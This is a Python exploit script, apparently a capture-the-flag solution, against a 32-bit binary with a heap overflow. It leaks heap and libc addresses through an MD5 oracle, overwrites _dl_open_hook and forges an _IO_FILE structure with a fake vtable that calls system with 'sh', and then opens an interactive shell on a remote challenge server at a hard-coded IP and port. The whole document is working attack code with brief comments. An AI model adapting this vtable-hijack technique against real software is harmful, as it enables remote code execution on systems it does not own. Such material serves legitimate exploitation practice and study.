from ptrlib import *

def without_salt(data):
    sock.sendafter("Text: ", data)
    sock.sendlineafter("[y/N] ", "N")
    sock.recvuntil("MD5: ")
    return sock.recvline()

def with_salt(data):
    sock.sendafter("Text: ", data)
    sock.sendlineafter("[y/N] ", "y")
    sock.recvuntil("MD5 (salted): ")
    md5sum = sock.recvline()
    sock.recvuntil("Salt: ")
    salt = eval(b'b"' + sock.recvline() + b'"')
    return salt, md5sum

"""
libc = ELF("/lib32/libc-2.27.so")
sock = Process("../distfiles/chall")
heap_delta = 0x19c
"""
libc = ELF("../distfiles/libc-2.24.so")
sock = Socket("76.74.177.238", 9004)
heap_delta = 0x44
#"""

# 1) leak heap address
# We can easily leak heap address due to the heap overflow
# just by finding an address whose MD5 matches the result.
payload = b'A' * 0x200
result = without_salt(payload)
robot = Process(["./calc_heap", bytes2str(result)])
addr_heap = int(robot.recvline(), 16) - heap_delta
robot.close()
logger.info("addr heap = " + hex(addr_heap))

# 2) leak libc address
# Same principle as Step 1.
payload = b'A' * 0x23c
result = without_salt(payload)
robot = Process(["./calc_libc", bytes2str(result)])
libc_base = int(robot.recvline(), 16) - libc.symbol("_IO_2_1_stderr_")
robot.close()
logger.info("libc base = " + hex(libc_base))

# 3) Overwrite _IO_FILE
# We can overwrite the adjacent chunk used for _IO_FILE of the banner.
# Before changing the vtable, we have to change _dl_open_hook by using salt.
# After that we can change the vtable without being detected.
# As we can't use one gadget, we have to pass '/bin/sh' to the system function.
# When _IO_file_close_it is called, the stack top points to _IO_FILE itself.
# Thus we just have to put 'sh; ' instead of 0xfbad2498.
fake_vtable = p32(0) * 2
fake_vtable += p32(libc_base + libc.symbol("system")) * 19
fake_vtable += p32(0) * 2

io_file = b''
#io_file += p32(0xfbad2498)
io_file += b'sh; '
io_file += p32(addr_heap + 0x3b0) * 8
io_file += p32(0) * 1
io_file += b';/bin/sh'
io_file += p32(0) * 1
io_file += p32(libc_base + libc.symbol("_IO_2_1_stderr_"))
io_file += p32(3)
io_file += p32(0) * 3
io_file += p32(addr_heap + 0x2e8)
io_file += p32(0xffffffff) * 2
io_file += p32(0)
io_file += p32(addr_heap + 0x2f4)
io_file += p32(0) * 3
io_file += p32(0xffffffff)
io_file += p32(0) * 10
io_file += p32(addr_heap + heap_delta + 8) # fake vtable

payload = b'AAAA' # avoid null
payload += fake_vtable
payload += b'A' * (0x200 - len(payload))
payload += p32(libc_base + libc.symbol("_dl_open_hook")) # salt
payload += p32(0x161)
payload += io_file
assert b'\n' not in payload

with_salt(payload)

# get the shell!!!
sock.interactive()
